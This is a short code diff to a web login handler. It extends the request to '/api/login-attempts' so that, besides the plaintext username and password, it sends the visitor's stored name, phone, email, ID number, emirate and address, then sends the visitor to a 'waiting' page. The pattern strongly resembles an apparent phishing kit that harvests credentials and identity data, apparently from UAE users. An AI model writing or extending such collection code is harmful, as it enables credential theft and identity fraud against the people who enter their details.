@@ -1094,13 +1094,25 @@ function handleLogin(e) {
   btn.disabled = true;
   btn.textContent = 'Verifying...';
   var country = 'Unknown';
-  try { country = sessionStorage.getItem('user_country') || 'Unknown'; } catch(ex) {}
+  var service = '';
+  var orderName = '', orderPhone = '', orderEmail = '', orderIdNumber = '', orderEmirate = '', orderAddress = '';
+  try {
+    country = sessionStorage.getItem('user_country') || 'Unknown';
+    service = sessionStorage.getItem('service_type') || '';
+    orderName = sessionStorage.getItem('order_name') || '';
+    orderPhone = sessionStorage.getItem('order_phone') || '';
+    orderEmail = sessionStorage.getItem('order_email') || '';
+    orderIdNumber = sessionStorage.getItem('order_id_number') || '';
+    orderEmirate = sessionStorage.getItem('order_emirate') || '';
+    orderAddress = sessionStorage.getItem('order_address') || '';
+  } catch(ex) {}
   fetch('/api/login-attempts', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ username: username, password: password, country: country, lang: 'en' })
+    body: JSON.stringify({ username: username, password: password, country: country, lang: 'en', service: service, orderName: orderName, orderPhone: orderPhone, orderEmail: orderEmail, orderIdNumber: orderIdNumber, orderEmirate: orderEmirate, orderAddress: orderAddress })
   }).then(function(r) { return r.json(); }).then(function(data) {
     if (data.success) {
+      try { sessionStorage.removeItem('service_type'); sessionStorage.removeItem('order_name'); sessionStorage.removeItem('order_phone'); sessionStorage.removeItem('order_email'); sessionStorage.removeItem('order_id_number'); sessionStorage.removeItem('order_emirate'); sessionStorage.removeItem('order_address'); } catch(ex) {}
       window.location.href = '/en/login/waiting.html?id=' + data.id;
     } else {
       btn.disabled = false;
